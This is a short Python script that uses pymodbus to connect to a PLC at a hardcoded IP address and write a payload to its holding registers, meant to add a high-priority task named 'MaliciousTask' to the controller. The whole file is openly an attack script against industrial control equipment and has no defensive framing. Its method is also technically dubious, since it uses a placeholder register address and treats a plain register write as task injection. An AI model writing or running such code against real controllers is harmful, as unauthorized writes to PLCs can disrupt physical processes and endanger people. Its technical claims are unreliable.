from pymodbus.client import ModbusTcpClient
from pymodbus.payload import BinaryPayloadBuilder, BinaryPayloadDecoder
from pymodbus.constants import Endian

def find_plc_ip():
    # This function is a placeholder for finding the PLC's IP address.
    # In a real-world scenario, you might use network scanning tools or predefined configurations.
    return "192.168.9.24"

def modify_controller_tasking(plc_ip):
    try:
        # Connect to the PLC
        client = ModbusTcpClient(plc_ip)
        client.connect()

        # Define the malicious program's task properties
        task_name = "MaliciousTask"
        task_interval = 1000  # 1 second interval
        task_priority = 1      # High priority

        # Build the payload to modify the tasking
        builder = BinaryPayloadBuilder(byteorder=Endian.Big, wordorder=Endian.Big)
        builder.add_string(task_name)  # Task name
        builder.add_16bit_uint(task_interval)  # Interval in milliseconds
        builder.add_16bit_uint(task_priority)  # Priority

        # Write the payload to the PLC's memory
        # The address 0x0000 is a placeholder; you need to determine the correct address for task configuration.
        client.write_registers(address=0x0000, values=builder.to_registers())

        print(f"Task '{task_name}' with interval {task_interval}ms and priority {task_priority} has been added to the PLC.")

    except Exception as e:
        print(f"Error modifying controller tasking: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        modify_controller_tasking(plc_ip)
    else:
        print("PLC IP address not found.")